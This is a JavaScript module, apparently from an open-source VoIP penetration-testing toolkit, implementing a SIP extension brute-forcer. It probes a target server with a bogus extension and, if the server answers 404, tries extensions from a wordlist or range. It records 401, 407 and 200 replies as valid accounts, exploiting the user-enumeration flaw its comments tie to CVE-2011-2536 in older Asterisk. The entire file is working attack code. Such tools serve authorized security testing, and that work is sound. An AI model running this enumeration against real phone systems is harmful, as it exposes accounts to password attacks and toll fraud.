/*
Copyright Jesus Perez <jesusprubio gmail com>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

'use strict';

var async  = require('async'),

    SipFakeStack = require('../utils/sipFakeStack'),
    sipParser    = require('../utils/sipParser'),
    printer      = require('../utils/printer');


module.exports = (function () {

    return {

        info : {
            name : 'sipBruteExt',
            description : 'SIP extension brute-forcer.',
            options : {
                target : {
                    description  : 'IP address to attack',
                    defaultValue : '127.0.0.1',
                    type         : 'targetIp'
                },
                port : {
                    description  : 'Port to use',
                    defaultValue : 5060,
                    type         : 'port'
                },
                transport : {
                    description  : 'Underlying protocol',
                    defaultValue : 'UDP',
                    type         : 'protocols'
                },
                tlsType : {
                    description  : 'Version of TLS protocol to use (only when TLS)',
                    defaultValue : 'TLSv1',
                    type         : 'tlsType'
                },
                wsPath : {
                    description  : 'Websockets path (only when websockets)',
                    defaultValue : 'ws',
                    type         : 'anyValue'
                },
                extensions : {
                    description  : 'Extension, range (ie: range:0000-0100) or file with them to test',
                    defaultValue : 'file:artifacts/dics/johnPlusNum.txt',
                    type         : 'userPass'
                },
                meth : {
                    description  : 'Type of SIP packets to do the requests',
                    defaultValue : 'REGISTER',
                    type         : 'sipRequests'
                },
                srcHost : {
                    description  : 'Source host to include in the  SIP request ("external" and "random" supported)',
                    defaultValue : 'iface:eth0',
                    type         : 'srcHost'
                },
                srcPort : {
                    description  : 'Source port to include in the  SIP request',
                    defaultValue : 'random',
                    type         : 'portRand'
                },
                domain : {
                    description  : 'Domain to explore ("ip" to use the target)',
                    defaultValue : 'ip',
                    type         : 'domainIp'
                },
                delay : {
                    description  : 'Delay between requests in ms.',
                    defaultValue : 0,
                    type         : 'positiveInt'
                },
                timeout : {
                    description  : 'Time to wait for a response (ms.)',
                    defaultValue : 5000,
                    type         : 'positiveInt'
                }
            }
        },

        run : function (options, callback) {
            var result      = {
                    valid  : [],
                    errors : []
                },
                limit       = 1,
                indexCount  = 0, // User with delay to know in which index we are
                stackConfig = {
                    server    : options.target    || null,
                    port      : options.port      || '5060',
                    transport : options.transport || 'UDP',
                    timeout   : options.timeout   || 10000,
                    wsPath    : options.wsPath    || null,
                    tlsType   : options.tlsType   || 'TLSv1',
                    srcHost   : options.srcHost   || null,
                    lport     : options.srcPort   || null,
                    domain    : options.domain    || null
                },
                fakeStack, msgConfig;

            // Impossible extension at init, to check if vulnerable
            fakeStack = new SipFakeStack(stackConfig);
            msgConfig = {
                meth    : options.meth,
                fromExt : 'olakasetu',
                // To force inf INVITE, OPTIONS, etc. (better results)
                toExt   : 'olakasetu'
            };

            fakeStack.send(msgConfig, function (err, res) {
                var hasAuth       = true,
                    partialResult = {},
                    finalRes, resCode;

                // We want to stop the full chain
                if (err) {
                    callback(err);
                } else {
                    finalRes = res.msg;
                    resCode = sipParser.code(finalRes);

                    // Checking if vulnerable
                    if (resCode !== '404') {
                        printer.info('Host not vulnerable (' + options.meth + ')');
                        callback(null, {
                            vulnerable : false,
                            data       : finalRes
                        });
                    } else {
                        async.eachSeries(
                            options.extensions,
                            function (extension, asyncCb) {
                                // We use a new stack in each request to simulate different users
                                msgConfig = {
                                    meth    : options.meth,
                                    fromExt : extension,
                                    toExt   : extension
                                };

                                indexCount += 1;
                                fakeStack = new SipFakeStack(stackConfig);

                                // TODO: We need to be more polited here, an ACK and BYE
                                // is needed to avoid loops
                                fakeStack.send(msgConfig, function (err, res) {
                                    var hasAuth       = true,
                                        partialResult = {};

                                    if (!err) {
                                        finalRes = res.msg;
                                        resCode = sipParser.code(finalRes);
                                        // CVE-2011-2536, it works if the server has alwaysauthreject=no,
                                        // which is the default in old Asterisk versions.
                                        // http://downloads.asterisk.org/pub/security/AST-2009-003.html
                                        // http://downloads.asterisk.org/pub/security/AST-2011-011.html
                                        // TODO: No CVE, some links:
                // http://packetstormsecurity.com/search/?q=francesco+tornieri+SIP+User+Enumeration&s=files
                // http://packetstormsecurity.com/files/100515/Asterisk-1.4.x-1.6.x-Username-Enumeration.html
                // http://www.cvedetails.com/cve/CVE-2009-3727/
                // http://www.cvedetails.com/cve/CVE-2011-2536/
                // http://www.cvedetails.com/cve/CVE-2011-4597/
                // https://github.com/jesusprubio/bluebox-ng/blob/master/src/modules/sipBruteExtAst.coffee
                // https://github.com/jesusprubio/metasploit-sip/blob/master/enumerator_asterisk_nat_peers.rb
                                        if(['401', '407', '200'].indexOf(resCode) !== -1) {
                                            if (resCode === '200') {
                                                hasAuth = false;
                                            } else {
                                                hasAuth = true;
                                            }

                                            partialResult = {
                                                extension : extension,
                                                auth      : hasAuth,
                                                data      : res.msg
                                            };
                                        }

                                        // We only add valid extensions to final result
                                        if (Object.keys(partialResult).length !== 0) {
                                            result.valid.push(partialResult);
                                            printer.highlight('Extension found: ' + extension);
                                        } else {
                                        // but we print info about tested ones
                                            printer.infoHigh('Extension not found: ' + extension);
                                        }
                                        // Last element
                                        if (indexCount === options.extensions.length) {
                                            asyncCb();
                                        } else {
                                            setTimeout(asyncCb, options.delay);
                                        }
                                    } else {
                                        // We don't want to stop the full chain
                                        result.errors.push({
                                            extension : extension,
                                            data      : err
                                        });
                                        asyncCb();
                                    }
                                });
                            }, function (err) {
                                callback(err, result);
                            }
                        );
                    }
                }
            });
        }
    };

}());
